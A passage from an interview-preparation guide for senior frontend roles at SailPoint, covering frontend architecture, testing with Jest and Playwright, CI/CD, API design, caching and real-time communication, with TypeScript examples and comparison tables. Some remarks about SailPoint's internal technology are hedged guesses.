├── Single build, single deploy
├── Shared dependencies
├── Simple but doesn't scale with teams
└── SailPoint IdentityIQ (legacy) uses this approach

MONOREPO (Shared codebase, independent packages)
├── Multiple packages in one repository
├── Shared tooling (lint, test, build)
├── Independent versioning and publishing
├── Code sharing via packages
├── Nx/Lerna for orchestration
└── SailPoint IdentityNow likely uses this

MICRO-FRONTENDS (Independent apps composed at runtime)
├── Each team owns a vertical slice
├── Independent deploy cycles
├── Technology agnostic (React + Angular can coexist)
├── Runtime composition (Module Federation, iframes, Web Components)
└── Complex but scales with large organizations
```

```
Multi-Tenant SaaS Dashboard Design (SailPoint Context):

┌─────────────────────────────────────────────────────────┐
│ App Shell (shared across tenants)                        │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ Header: Tenant Logo | Navigation | User Menu        │ │
│ └─────────────────────────────────────────────────────┘ │
│ ┌──────────┐ ┌────────────────────────────────────────┐ │
│ │ Sidebar  │ │ Main Content Area                      │ │
│ │          │ │ ┌──────────┐ ┌──────────┐ ┌─────────┐ │ │
│ │ Dashboard│ │ │ Identity │ │ Risk     │ │ Pending │ │ │
│ │ Identities│ │ Summary  │ │ Overview │ │ Certs   │ │ │
│ │ Access   │ │ │ Widget   │ │ Widget   │ │ Widget  │ │ │
│ │ Certs    │ │ └──────────┘ └──────────┘ └─────────┘ │ │
│ │ Reports  │ │ ┌──────────────────────┐ ┌───────────┐ │ │
│ │ Admin    │ │ │ Recent Activity      │ │ Quick     │ │ │
│ │          │ │ │ Feed Widget          │ │ Actions   │ │ │
│ │          │ │ └──────────────────────┘ └───────────┘ │ │
│ └──────────┘ └────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

```typescript
// Multi-tenant configuration
interface TenantConfig {
  tenantId: string;
  apiBaseUrl: string;
  branding: {
    primaryColor: string;
    logo: string;
    companyName: string;
  };
  features: Record<string, boolean>; // Feature flags per tenant
  modules: string[]; // Enabled modules: ['access-requests', 'certifications', 'reports']
}

// Tenant-aware API client
class TenantApiClient {
  constructor(private config: TenantConfig) {}

  async fetch<T>(endpoint: string, options?: RequestInit): Promise<T> {
    const response = await fetch(`${this.config.apiBaseUrl}${endpoint}`, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'X-Tenant-Id': this.config.tenantId,
        ...options?.headers
      }
    });
    if (!response.ok) throw new ApiError(response.status, await response.text());
    return response.json();
  }
}

// Feature flag driven rendering
function DashboardWidgets({ config }: { config: TenantConfig }) {
  return (
    <div className="widget-grid">
      <IdentitySummaryWidget /> {/* Always shown */}
      {config.features.riskScoring && <RiskOverviewWidget />}
      {config.modules.includes('certifications') && <PendingCertsWidget />}
      {config.features.aiRecommendations && <AIInsightsWidget />}
    </div>
  );
}
```

| Architecture | Best For | Team Size | Deploy | SailPoint Fit |
|-------------|----------|-----------|--------|---------------|
| Monolith | Small apps, MVPs | 1-5 devs | Simple | IdentityIQ (legacy) |
| Monorepo | Shared design systems | 5-50 devs | Per-package | IdentityNow UI |
| Micro-frontends | Large orgs, many teams | 50+ devs | Independent | Future platform |

**SailPoint Context:** SailPoint IdentityNow serves hundreds of enterprise tenants, each with different enabled modules and branding. A monorepo with feature flags per tenant is the pragmatic choice — shared component library with tenant-specific configuration.

---

## Section 8: Testing & DevOps

### Q43: Explain unit testing strategies for frontend applications. Compare Jest, Jasmine, and Karma.

**Answer:**

```typescript
// JEST — most popular, built-in mocking, snapshot testing
// Used by: React ecosystem, SailPoint IdentityNow

// Testing a custom hook
import { renderHook, act } from '@testing-library/react-hooks';

function useIdentityFilter(identities: Identity[]) {
  const [filter, setFilter] = useState('');
  const filtered = useMemo(
    () => identities.filter(i =>
      i.name.toLowerCase().includes(filter.toLowerCase())
    ),
    [identities, filter]
  );
  return { filtered, setFilter };
}

describe('useIdentityFilter', () => {
  const mockIdentities: Identity[] = [
    { id: '1', name: 'Alice Admin', riskScore: 30 },
    { id: '2', name: 'Bob Builder', riskScore: 75 },
    { id: '3', name: 'Alice Manager', riskScore: 50 }
  ];

  it('should filter identities by name', () => {
    const { result } = renderHook(() => useIdentityFilter(mockIdentities));

    act(() => { result.current.setFilter('alice'); });

    expect(result.current.filtered).toHaveLength(2);
    expect(result.current.filtered.map(i => i.name)).toEqual([
      'Alice Admin', 'Alice Manager'
    ]);
  });

  it('should return all identities when filter is empty', () => {
    const { result } = renderHook(() => useIdentityFilter(mockIdentities));
    expect(result.current.filtered).toHaveLength(3);
  });
});
```typescript
// Testing React components with React Testing Library
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

describe('AccessRequestForm', () => {
  it('should submit access request with selected items', async () => {
    const onSubmit = jest.fn();
    render(<AccessRequestForm onSubmit={onSubmit} />);

    // Query by accessible role/label — not implementation details
    await userEvent.type(
      screen.getByRole('searchbox', { name: /search entitlements/i }),
      'admin'
    );

    await waitFor(() => {
      expect(screen.getByText('Admin Access')).toBeInTheDocument();
    });

    await userEvent.click(screen.getByText('Admin Access'));
    await userEvent.click(screen.getByRole('button', { name: /submit request/i }));

    expect(onSubmit).toHaveBeenCalledWith({
      requestedItems: [expect.objectContaining({ name: 'Admin Access' })]
    });
  });

  it('should show validation error for empty request', async () => {
    render(<AccessRequestForm onSubmit={jest.fn()} />);

    await userEvent.click(screen.getByRole('button', { name: /submit/i }));

    expect(screen.getByRole('alert')).toHaveTextContent(
      'Please select at least one access item'
    );
  });
});

// Mocking API calls
jest.mock('../api/identityApi', () => ({
  fetchIdentities: jest.fn().mockResolvedValue([
    { id: '1', name: 'Test User', riskScore: 42 }
  ])
}));
```

| Framework | Runner | Assertions | Mocking | Best For |
|-----------|--------|-----------|---------|----------|
| Jest | Built-in | Built-in | Built-in | React, modern JS |
| Jasmine | Built-in | Built-in | Built-in (spies) | Angular, legacy |
| Karma | Browser-based | Needs Jasmine/Mocha | Needs Sinon | Angular, real browser testing |
| Vitest | Vite-native | Jest-compatible | Built-in | Vite projects, fast |

**SailPoint Context:** SailPoint's IdentityIQ (Angular) uses Jasmine + Karma. IdentityNow (modern) likely uses Jest or Vitest. When interviewing, know both ecosystems.

---

### Q44: Explain E2E testing with Playwright and Cypress. When to use each?

**Answer:**

```typescript
// PLAYWRIGHT — Microsoft, multi-browser, fast, parallel
import { test, expect } from '@playwright/test';

test.describe('Identity Certification Flow', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/certifications');
    await page.waitForSelector('[data-testid="cert-list"]');
  });

  test('should approve an access item', async ({ page }) => {
    // Click first certification campaign
    await page.click('[data-testid="cert-item"]:first-child');

    // Wait for identity details to load
    await expect(page.locator('[data-testid="identity-name"]'))
      .toBeVisible();

    // Click approve button
    await page.click('[data-testid="approve-btn"]');

    // Verify status changed
    await expect(page.locator('[data-testid="status-badge"]'))
      .toHaveText('Approved');

    // Verify toast notification
    await expect(page.locator('[role="alert"]'))
      .toContainText('Access approved');
  });

  test('should bulk approve selected items', async ({ page }) => {
    // Select multiple items
    await page.click('[data-testid="select-all"]');

    // Click bulk approve
    await page.click('[data-testid="bulk-approve"]');

    // Confirm dialog
    await page.click('[data-testid="confirm-btn"]');

    // Verify all items approved
    const badges = page.locator('[data-testid="status-badge"]');
    await expect(badges).toHaveCount(await badges.count());
    for (const badge of await badges.all()) {
      await expect(badge).toHaveText('Approved');
    }
  });
});

// Playwright API mocking
test('should handle API errors gracefully', async ({ page }) => {
  await page.route('**/api/v3/certifications/**', route =>
    route.fulfill({ status: 500, body: 'Internal Server Error' })
  );

  await page.goto('/certifications/cert-123');
  await expect(page.locator('[data-testid="error-message"]'))
    .toContainText('Failed to load certification');
});
```

| Feature | Playwright | Cypress |
|---------|-----------|---------|
| Browsers | Chromium, Firefox, WebKit | Chrome, Firefox, Edge, Electron |
| Parallelism | ✅ Built-in | ❌ Requires paid plan |
| Multi-tab | ✅ | ❌ |
| iframes | ✅ Easy | ⚠️ Limited |
| Network mocking | ✅ `page.route()` | ✅ `cy.intercept()` |
| Speed | Faster | Slower (runs in browser) |
| Debugging | Trace viewer, VS Code | Time-travel, GUI |
| Language | JS/TS, Python, Java, C# | JS/TS only |

**SailPoint Context:** Playwright is preferred for SailPoint's complex multi-step governance workflows (access request → approval → provisioning) because it supports multi-tab testing and parallel execution across browsers.

---

### Q45: Explain the Testing Pyramid for frontend applications.

**Answer:**

```
                    ╱╲
                   ╱  ╲         E2E Tests (few, slow, expensive)
                  ╱ E2E╲        - Full user flows
                 ╱──────╲       - Real browser, real API (or mocked)
                ╱        ╲      - 5-10% of tests
               ╱Integration╲    
              ╱──────────────╲  Integration Tests (moderate)
             ╱                ╲ - Component interactions
            ╱   Component /    ╲- API integration
           ╱   Integration      ╲- 20-30% of tests
          ╱──────────────────────╲
         ╱                        ╲ Unit Tests (many, fast, cheap)
        ╱      Unit Tests          ╲- Pure functions, hooks, utils
       ╱────────────────────────────╲- Isolated components
      ╱                              ╲- 60-70% of tests
     ╱────────────────────────────────╲

     + Static Analysis (TypeScript, ESLint) — catches errors before tests run
```

**Frontend-specific testing strategy:**

| Layer | Tools | What to Test | Speed | SailPoint Example |
|-------|-------|-------------|-------|-------------------|
| Static | TypeScript, ESLint | Type errors, code quality | Instant | Type-safe API contracts |
| Unit | Jest/Vitest | Utils, hooks, pure logic | ~1ms each | Risk score calculation |
| Component | RTL, Storybook | Render, interactions | ~50ms each | IdentityCard component |
| Integration | RTL + MSW | Multi-component flows | ~200ms each | Access request form + API |
| E2E | Playwright | Full user journeys | ~5s each | Certification review flow |
| Visual | Chromatic, Percy | UI regression | ~2s each | Design system components |

```typescript
// Example: Testing at each layer for "Approve Access" feature

// UNIT: Pure function
test('calculateRiskDelta returns correct delta', () => {
  expect(calculateRiskDelta(
    { currentScore: 45 },
    { entitlementRisk: 20 }
  )).toBe(65);
});

// COMPONENT: Isolated component
test('ApproveButton shows confirmation dialog', async () => {
  render(<ApproveButton onApprove={jest.fn()} />);
  await userEvent.click(screen.getByRole('button', { name: /approve/i }));
  expect(screen.getByRole('dialog')).toBeInTheDocument();
});

// INTEGRATION: Component + API (using MSW for mocking)
test('approval flow updates UI after API success', async () => {
  server.use(
    rest.post('/api/v3/certifications/:id/approve', (req, res, ctx) =>
      res(ctx.json({ status: 'approved' }))
    )
  );
  render(<CertificationReview certId="cert-123" />);
  await userEvent.click(screen.getByRole('button', { name: /approve/i }));
  await waitFor(() => {
    expect(screen.getByText('Approved')).toBeInTheDocument();
  });
});
```

---

### Q46: Describe a CI/CD pipeline for a frontend application.

**Answer:**

```yaml
# .github/workflows/frontend-ci.yml (conceptual)
# SailPoint-style CI/CD pipeline

Pipeline Stages:
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  Install  │──▶│  Lint &   │──▶│  Unit    │──▶│  Build   │──▶│  E2E     │
│  & Cache  │   │  Type     │   │  Tests   │   │          │   │  Tests   │
│           │   │  Check    │   │          │   │          │   │          │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
                                                    │              │
                                                    ▼              ▼
                                              ┌──────────┐   ┌──────────┐
                                              │  Visual   │   │  Deploy  │
                                              │  Regress  │   │  Preview │
                                              └──────────┘   └──────────┘
                                                                   │
                                                    ┌──────────────┤
                                                    ▼              ▼
                                              ┌──────────┐   ┌──────────┐
                                              │  Deploy   │   │  Deploy  │
                                              │  Staging  │   │  Prod    │
                                              └──────────┘   └──────────┘
```

```yaml
# Key pipeline steps:

1. Install & Cache:
   - yarn install --frozen-lockfile
   - Cache node_modules and Nx cache
   - Only run affected packages (nx affected)

2. Static Analysis (parallel):
   - yarn lint (ESLint)
   - yarn typecheck (TypeScript)
   - yarn format:check (Prettier)

3. Unit Tests:
   - yarn test --coverage
   - Fail if coverage drops below threshold (80%)
   - Upload coverage report to Codecov/SonarQube

4. Build:
   - yarn build (production build)
   - Analyze bundle size (bundlesize / size-limit)
   - Fail if bundle exceeds budget

5. E2E Tests:
   - Start preview server
   - Run Playwright tests against preview
   - Upload test artifacts (screenshots, traces)

6. Deploy:
   - PR → Deploy preview URL (Vercel/Netlify)
   - Merge to main → Deploy to staging
   - Tag release → Deploy to production
   - Feature flags for gradual rollout
```

**Nx-specific optimizations:**
```bash
# Only test/build affected packages (saves CI time)
npx nx affected --target=test --base=main
npx nx affected --target=build --base=main

# Distributed task execution (Nx Cloud)
npx nx-cloud start-ci-run
npx nx affected --target=test --parallel=5
```

**SailPoint Context:** SailPoint's CI/CD pipeline must include security scanning (SAST/DAST), license compliance checks, and multi-tenant deployment validation. The `nx affected` command is critical for monorepo efficiency — only rebuilding/retesting packages that changed.

---

## Section 9: REST API & Data Patterns

### Q47: Compare REST vs GraphQL vs gRPC. When would you use each?

**Answer:**

```
REST (Representational State Transfer):
- Resource-based URLs: GET /api/v3/identities/123
- Standard HTTP methods: GET, POST, PUT, PATCH, DELETE
- Stateless, cacheable
- Over-fetching / under-fetching problem
- SailPoint uses REST for all public APIs

GraphQL:
- Single endpoint: POST /graphql
- Client specifies exactly what data it needs
- Strongly typed schema
- No over-fetching — request only needed fields
- Real-time via subscriptions

gRPC:
- Binary protocol (Protocol Buffers)
- Strongly typed contracts (.proto files)
- Bidirectional streaming
- Not browser-native (needs gRPC-Web proxy)
- Best for service-to-service communication
```

```typescript
// REST — SailPoint V3 API pattern
// Problem: Over-fetching (get entire identity when you only need name + risk)
const identity = await fetch('/api/v3/identities/123');
// Returns ALL fields: name, email, phone, address, manager, entitlements, ...

// Problem: Under-fetching (need multiple requests)
const identity = await fetch('/api/v3/identities/123');
const entitlements = await fetch('/api/v3/identities/123/entitlements');
const accessProfiles = await fetch('/api/v3/identities/123/access-profiles');

// GraphQL — solves both problems
const query = `
  query GetIdentityDashboard($id: ID!) {
    identity(id: $id) {
      name
      riskScore
      entitlements(first: 10) {
        name
        source { name }
      }
      pendingCertifications {
        id
        dueDate
        itemCount
      }
    }
  }
`;
// Single request, exact data needed, strongly typed
```

| Aspect | REST | GraphQL | gRPC |
|--------|------|---------|------|
| Protocol | HTTP/1.1+ | HTTP/1.1+ | HTTP/2 |
| Data format | JSON/XML | JSON | Protobuf (binary) |
| Typing | OpenAPI/Swagger | Schema (SDL) | .proto files |
| Caching | ✅ HTTP cache | ⚠️ Complex (POST) | ❌ Custom |
| Over-fetching | ⚠️ Common | ✅ Solved | ✅ Solved |
| Learning curve | Low | Medium | High |
| Browser support | ✅ Native | ✅ Native | ⚠️ Needs proxy |
| File upload | ✅ Multipart | ⚠️ Complex | ✅ Streaming |
| Real-time | WebSocket/SSE | Subscriptions | Bidirectional streaming |

**SailPoint Context:** SailPoint's public APIs are REST-based (V3 API). For internal dashboard optimization, a BFF (Backend for Frontend) pattern with GraphQL could aggregate multiple REST calls into a single optimized response — reducing the number of round trips for the identity dashboard.

---

### Q48: Explain API versioning strategies for frontend applications.

**Answer:**

```
1. URL Path Versioning (SailPoint uses this)
   GET /api/v3/identities
   GET /api/v2/identities (deprecated)

   ✅ Simple, explicit, easy to route
   ❌ URL pollution, hard to sunset

2. Header Versioning
   GET /api/identities
   Accept: application/vnd.sailpoint.v3+json

   ✅ Clean URLs
   ❌ Hidden, harder to test in browser

3. Query Parameter Versioning
   GET /api/identities?version=3

   ✅ Easy to implement
   ❌ Breaks caching, not RESTful

4. Content Negotiation
   Accept: application/json; version=3

   ✅ HTTP standard
   ❌ Complex to implement
```

```typescript
// Frontend API client with version management
class SailPointApiClient {
  private baseUrl: string;
  private version: string;

  constructor(config: { baseUrl: string; version?: string }) {
    this.baseUrl = config.baseUrl;
    this.version = config.version || 'v3';
  }

  async get<T>(endpoint: string): Promise<T> {
    const response = await fetch(
      `${this.baseUrl}/api/${this.version}/${endpoint}`
    );
    return response.json();
  }

  // Version-specific method for backward compatibility
  async getIdentityV2(id: string): Promise<IdentityV2> {
    const response = await fetch(`${this.baseUrl}/api/v2/identities/${id}`);
    return response.json();
  }

  async getIdentityV3(id: string): Promise<IdentityV3> {
    const response = await fetch(`${this.baseUrl}/api/v3/identities/${id}`);
    return response.json();
  }
}

// Adapter pattern for version migration
function adaptV2ToV3(v2Identity: IdentityV2): IdentityV3 {
  return {
    id: v2Identity.id,
    name: v2Identity.displayName, // renamed field
    email: v2Identity.emailAddress,
    riskScore: v2Identity.riskLevel === 'HIGH' ? 80 : 30, // enum → number
    // ... map other fields
  };
}
```

**SailPoint Context:** SailPoint maintains V2 and V3 APIs simultaneously. Frontend code must handle both during migration periods. The adapter pattern ensures UI components work with a consistent data shape regardless of which API version is called.

---

### Q49: Explain caching strategies — HTTP cache, CDN, and application-level caching.

**Answer:**

```
Caching Layers (from closest to user → farthest):

1. Browser Memory Cache (fastest)
   └── React state, React Query cache, Zustand store

2. Browser HTTP Cache (Cache-Control headers)
   └── Disk cache for static assets, API responses

3. Service Worker Cache (offline support)
   └── Programmatic cache with strategies

4. CDN Cache (edge servers)
   └── Static assets, API responses at edge

5. Server Cache (Redis, Memcached)
   └── Database query results, computed data
```

```typescript
// HTTP Cache Headers (set by server, respected by browser)

// Static assets — cache forever (use content hash in filename)
// Cache-Control: public, max-age=31536000, immutable
// File: main.a1b2c3d4.js

// API responses — short cache with revalidation
// Cache-Control: private, max-age=60, stale-while-revalidate=300
// ETag: "abc123"

// No cache (sensitive data like identity details)
// Cache-Control: no-store, no-cache, must-revalidate

// Application-level caching with React Query / TanStack Query
import { useQuery, useQueryClient } from '@tanstack/react-query';

function useIdentity(id: string) {
  return useQuery({
    queryKey: ['identity', id],
    queryFn: () => fetchIdentity(id),
    staleTime: 5 * 60 * 1000,     // Consider fresh for 5 minutes
    gcTime: 30 * 60 * 1000,       // Keep in cache for 30 minutes
    refetchOnWindowFocus: true,     // Refetch when user returns to tab
    retry: 3,                       // Retry failed requests
  });
}

// Optimistic update pattern
function useApproveAccess() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: (itemId: string) =>
      fetch(`/api/v3/certifications/items/${itemId}/approve`, { method: 'POST' }),

    onMutate: async (itemId) => {
      // Cancel outgoing refetches
      await queryClient.cancelQueries({ queryKey: ['certification-items'] });

      // Snapshot previous value
      const previous = queryClient.getQueryData(['certification-items']);

      // Optimistically update
      queryClient.setQueryData(['certification-items'], (old: any) =>
        old.map((item: any) =>
          item.id === itemId ? { ...item, status: 'approved' } : item
        )
      );

      return { previous };
    },

    onError: (err, itemId, context) => {
      // Rollback on error
      queryClient.setQueryData(['certification-items'], context?.previous);
    },

    onSettled: () => {
      // Refetch to ensure consistency
      queryClient.invalidateQueries({ queryKey: ['certification-items'] });
    }
  });
}
```

| Strategy | Speed | Freshness | Offline | Use Case |
|----------|:---:|:---:|:---:|---|
| Memory (React state) | ⚡ Instant | Session only | ❌ | UI state, form data |
| React Query | ⚡ Instant + bg refresh | Configurable | ❌ | API data with SWR |
| HTTP Cache | Fast | Header-controlled | ❌ | Static assets, API |
| Service Worker | Fast | Strategy-dependent | ✅ | Offline-first apps |
| CDN | Fast (edge) | TTL-based | ❌ | Global static assets |

**SailPoint Context:** Identity data has different caching needs — the identity list can be cached for minutes (stale-while-revalidate), but certification decisions must never be cached (no-store) to prevent stale approval states.

---

### Q50: Compare WebSocket vs Server-Sent Events (SSE) vs Long Polling. When to use each?

**Answer:**

```
1. WEBSOCKET — Full-duplex, bidirectional communication
   Client ←→ Server (both can send at any time)

2. SERVER-SENT EVENTS (SSE) — Server → Client only (unidirectional)
   Client ← Server (server pushes updates)

3. LONG POLLING — Client repeatedly asks server for updates
   Client → Server → (waits) → Response → Client → Server → ...
```

```javascript
// 1. WEBSOCKET — bidirectional, real-time
const ws = new WebSocket('wss://notifications.sailpoint.com/ws');

ws.onopen = () => {
  // Client can send messages TO server
  ws.send(JSON.stringify({
    type: 'subscribe',
    channels: ['certifications', 'access-requests']
  }));
};

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  handleNotification(message);
};

// 2. SERVER-SENT EVENTS — server pushes, auto-reconnect
const eventSource = new EventSource('/api/v3/events/stream', {
  withCredentials: true
});

eventSource.addEventListener('certification-update', (event) => {
  const data = JSON.parse(event.data);
  updateCertificationStatus(data);
});

eventSource.addEventListener('risk-alert', (event) => {
  const data = JSON.parse(event.data);
  showRiskAlert(data);
});

eventSource.onerror = () => {
  // EventSource auto-reconnects — no manual logic needed
  console.log('SSE connection lost, reconnecting...');
};

// 3. LONG POLLING — fallback for older environments
async function longPoll() {
  try {
    const response = await fetch('/api/v3/events/poll', {
      signal: AbortSignal.timeout(30000) // 30s timeout
    });
    const events = await response.json();
    events.forEach(handleEvent);
  } catch (error) {
    if (error.name !== 'AbortError') {
      await new Promise(resolve => setTimeout(resolve, 5000)); // backoff
    }
  }
  longPoll(); // Immediately poll again
}
```

| Feature | WebSocket | SSE | Long Polling |
|---------|:---------:|:---:|:------------:|
| Direction | Bidirectional | Server → Client | Client → Server |
| Protocol | ws:// / wss:// | HTTP/1.1+ | HTTP/1.1+ |
| Auto-reconnect | ❌ Manual | ✅ Built-in | ❌ Manual |
| Binary data | ✅ | ❌ Text only | ✅ |
| HTTP/2 multiplexing | ❌ | ✅ | ✅ |
| Max connections | Browser limit (~6) | Browser limit (~6) | Browser limit (~6) |
| Proxy/firewall friendly | ⚠️ Sometimes blocked | ✅ Standard HTTP | ✅ Standard HTTP |
| Complexity | High | Low | Medium |
| Best for | Chat, gaming, collab editing | Notifications, feeds, dashboards | Legacy fallback |

**Decision Matrix for SailPoint:**

| Use Case | Recommended | Why |
|----------|-------------|-----|
| Certification status updates | SSE | Server pushes status changes, no client→server needed |
| Real-time notifications | WebSocket | Need bidirectional (read receipts, subscribe/unsubscribe) |
| Dashboard metrics refresh | SSE | Server pushes updated metrics periodically |
| Collaborative access review | WebSocket | Multiple reviewers need real-time sync |
| Legacy browser support | Long Polling | Fallback when WebSocket/SSE unavailable |

**SailPoint Context:** For IdentityNow's real-time features:
- **Certification campaigns:** SSE for status updates (server pushes when items are approved/revoked)
- **Notifications:** WebSocket for bidirectional communication (subscribe to channels, send read receipts)
- **Dashboard widgets:** SSE for periodic metric updates (identity count, risk distribution)
- **Provisioning status:** SSE for tracking long-running provisioning operations

---

## Quick Reference: SailPoint Interview Cheat Sheet

### SailPoint Technology Stack (What They Use)
- **IdentityIQ (Legacy):** Java, JSF, ExtJS, jQuery, AngularJS
- **IdentityNow (Modern):** Angular, TypeScript, REST APIs (V3), Bootstrap
- **Build Tools:** Likely Webpack/Nx, CI/CD with Jenkins/GitHub Actions
- **APIs:** REST V3 with JSON, OAuth 2.0 / JWT authentication

### Key SailPoint Domain Terms to Know
| Term | Meaning |
|------|---------|
| Identity | A person or service account in the system |
| Entitlement | A specific permission or access right |
| Access Profile | A bundle of entitlements |
| Role | A collection of access profiles |
| Certification | Periodic review of who has access to what |
| Provisioning | Granting/revoking access on target systems |
| SoD (Separation of Duties) | Policy preventing toxic access combinations |
| Source | A connected system (AD, Salesforce, SAP, etc.) |
| Governance | Policies and processes for managing access |
| IGA | Identity Governance and Administration |

### L3 Support Debugging Mindset (SailPoint Values This)
1. **Reproduce** — Get exact steps, browser, network conditions
2. **Isolate** — Is it frontend, API, or backend? Check Network tab
3. **Inspect** — Console errors, API response payloads, state snapshots
4. **Trace** — Follow data flow from API → store → component → DOM
5. **Fix** — Minimal change, add regression test, document root cause
6. **Prevent** — Add monitoring, error boundaries, better error messages

---

> **Document:** sailpoint-frontend-interview-part3.md
> **Coverage:** 50 questions across 9 sections
> **Level:** Senior/Staff Front End Engineer (7+ years)
> **Companion Files:** sailpoint-angular-interview-part1.md, sailpoint-angular-interview-part2.md
